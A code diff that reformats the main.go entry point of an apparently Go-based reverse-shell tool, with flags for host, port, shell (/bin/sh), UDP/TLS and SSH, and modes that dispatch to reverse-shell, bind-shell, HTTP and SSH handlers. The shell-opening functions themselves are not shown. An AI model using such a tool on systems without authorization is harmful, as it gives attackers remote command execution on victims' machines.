@@ -1,20 +1,20 @@
 package main
 
 import (
-	"time"
-    "flag"
+	"flag"
 	"fmt"
+	"time"
 )
 
 type Config struct {
-	Address 	string
-	Shell		string
-	Proto		string
-	Mode		string
-	HTTPServer	bool
-	Scheme		string
-	Hash		string
-	Reconnect 	time.Duration
+	Address    string
+	Shell      string
+	Proto      string
+	Mode       string
+	HTTPServer bool
+	Scheme     string
+	Hash       string
+	Reconnect  time.Duration
 }
 
 const (
@@ -26,7 +26,7 @@ func main() {
 	var host, port, reconnect string
 	var udp, tls bool
 
-    flag.StringVar(&host, "host", "127.0.0.1", "Host")
+	flag.StringVar(&host, "host", "127.0.0.1", "Host")
 	flag.StringVar(&port, "port", "1234", "Port")
 	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
 	flag.BoolVar(&udp, "u", false, "Enable UDP")
@@ -38,7 +38,7 @@ func main() {
 	flag.StringVar(&config.Hash, "hash", "", "SHA256 hashed password for SSH authentication")
 
 	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
-    flag.Parse()
+	flag.Parse()
 
 	config.Address = host + ":" + port
 	config.Reconnect, _ = time.ParseDuration(reconnect)
@@ -55,27 +55,25 @@ func main() {
 	}
 
 	switch config.Mode {
-	case "connect" :
+	case "connect":
 		if udp {
 			UDPReverseShell(config)
 		} else {
 			TCPReverseShell(config)
 		}
-		break
-	case "listen" :
+	case "listen":
 		if udp {
 			UDPBind(config)
 		} else {
 			TCPBind(config)
 		}
-		break
-	case "http" :
+	case "http":
 		if config.HTTPServer {
 			AsyncHTTPServer(config)
 		} else {
 			AsyncHTTPClient(config)
 		}
-	case "ssh" :
+	case "ssh":
 		if config.Hash == "" {
 			fmt.Println("Must specify hashed password \"-hash\"")
 			return
